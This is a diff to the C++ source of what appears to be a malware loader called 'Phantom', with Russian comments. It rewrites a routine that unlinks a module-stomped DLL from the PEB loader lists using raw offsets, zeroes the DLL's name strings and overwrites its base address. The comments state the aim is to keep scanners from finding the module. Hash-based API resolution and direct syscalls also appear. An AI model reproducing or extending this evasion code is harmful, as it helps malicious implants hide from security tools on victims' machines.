@@ -11,6 +11,7 @@
 #include "Phantom.h"
 #include "ApiResolver.h"
 #include "Syscall.h"
+#include <intrin.h>
 
 namespace Phantom
 {
@@ -48,6 +49,7 @@ namespace Phantom
     // (VAD entry не меняется при NtProtectVirtualMemory)
     static bool VerifyMemImage(void* address, size_t size)
     {
+        UNREFERENCED_PARAMETER(size);
         // Resolve VirtualQuery via CRC32C hash
         HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
         if (!hK32) return false;
@@ -65,44 +67,75 @@ namespace Phantom
     // ═══ Удаление DLL из PEB LDR (модуль unlinking) ═══
     // После stomping DLL не должна быть видна в списке модулей
     // Техника из NovaLdr — сканеры не найдут её через PEB walk
+    // Raw byte offsets (no winternl.h dependency) — matches KnownDlls.cpp pattern
+    //
+    //  x64 LDR_DATA_TABLE_ENTRY offsets from InMemoryOrderLinks:
+    //    InLoadOrderLinks           at struct offset +0x00  →  curr - 0x10
+    //    InMemoryOrderLinks         at struct offset +0x10  →  curr
+    //    InInitializationOrderLinks at struct offset +0x20  →  curr + 0x10
+    //    DllBase                    at struct offset +0x30  →  curr + 0x20
+    //    FullDllName                at struct offset +0x48  →  curr + 0x38
+    //    BaseDllName                at struct offset +0x58  →  curr + 0x48
     static void UnlinkFromPeb(HMODULE hModule)
     {
-        // PEB → Ldr → InMemoryOrderModuleList
-        PPEB peb = (PPEB)__readgsqword(0x60);
-        if (!peb || !peb->Ldr) return;
+        // PEB via GS:[0x60] on x64
+        unsigned __int64 pebAddr = __readgsqword(0x60);
 
-        PLIST_ENTRY head = &peb->Ldr->InMemoryOrderLinks;
-        PLIST_ENTRY curr = head->Flink;
+        // PEB.Ldr at offset +0x18
+        BYTE* pLdr = *(BYTE**)(pebAddr + 0x18);
+        if (!pLdr) return;
+
+        // InMemoryOrderModuleList head at Ldr + 0x20
+        BYTE* head = pLdr + 0x20;
+        BYTE* curr = *(BYTE**)head; // head->Flink
 
         while (curr != head)
         {
-            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(
-                curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+            // DllBase at curr + 0x20
+            PVOID dllBase = *(PVOID*)(curr + 0x20);
 
-            if (entry->DllBase == (PVOID)hModule)
+            if (dllBase == (PVOID)hModule)
             {
-                // Unlink из трёх списков
-                entry->InLoadOrderLinks.Flink->Blink = entry->InLoadOrderLinks.Blink;
-                entry->InLoadOrderLinks.Blink->Flink = entry->InLoadOrderLinks.Flink;
+                // Unlink из трёх списков (LIST_ENTRY: Flink +0x00, Blink +0x08)
 
-                entry->InMemoryOrderLinks.Flink->Blink = entry->InMemoryOrderLinks.Blink;
-                entry->InMemoryOrderLinks.Blink->Flink = entry->InMemoryOrderLinks.Flink;
+                // InLoadOrderLinks at curr - 0x10
+                BYTE* loadFlink = *(BYTE**)(curr - 0x10);
+                BYTE* loadBlink = *(BYTE**)(curr - 0x10 + 0x08);
+                *(BYTE**)(loadFlink + 0x08) = loadBlink; // Flink->Blink = Blink
+                *(BYTE**)(loadBlink)         = loadFlink;  // Blink->Flink = Flink
 
-                entry->InInitializationOrderLinks.Flink->Blink = entry->InInitializationOrderLinks.Blink;
-                entry->InInitializationOrderLinks.Blink->Flink = entry->InInitializationOrderLinks.Flink;
+                // InMemoryOrderLinks at curr
+                BYTE* memFlink = *(BYTE**)(curr);
+                BYTE* memBlink = *(BYTE**)(curr + 0x08);
+                *(BYTE**)(memFlink + 0x08) = memBlink;
+                *(BYTE**)(memBlink)         = memFlink;
+
+                // InInitializationOrderLinks at curr + 0x10
+                BYTE* initFlink = *(BYTE**)(curr + 0x10);
+                BYTE* initBlink = *(BYTE**)(curr + 0x10 + 0x08);
+                *(BYTE**)(initFlink + 0x08) = initBlink;
+                *(BYTE**)(initBlink)          = initFlink;
 
                 // Затираем имя DLL в PEB (сканеры читают FullDllName)
-                if (entry->FullDllName.Buffer)
-                    SecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.MaximumLength);
-                if (entry->BaseDllName.Buffer)
-                    SecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.MaximumLength);
+                // FullDllName UNICODE_STRING at curr + 0x38
+                USHORT fullMaxLen = *(USHORT*)(curr + 0x3A);
+                WCHAR* fullBuf    = *(WCHAR**)(curr + 0x40);
+                if (fullBuf && fullMaxLen > 0)
+                    SecureZeroMemory(fullBuf, fullMaxLen);
+
+                // BaseDllName UNICODE_STRING at curr + 0x48
+                USHORT baseMaxLen = *(USHORT*)(curr + 0x4A);
+                WCHAR* baseBuf    = *(WCHAR**)(curr + 0x50);
+                if (baseBuf && baseMaxLen > 0)
+                    SecureZeroMemory(baseBuf, baseMaxLen);
 
                 // Затираем DllBase чтобы сканер не нашёл базовый адрес
-                entry->DllBase = (PVOID)0x7FFF0000;
+                *(PVOID*)(curr + 0x20) = (PVOID)0x7FFF0000;
                 return;
             }
 
-            curr = curr->Flink;
+            // Move to next: curr->Flink
+            curr = *(BYTE**)curr;
         }
     }
 
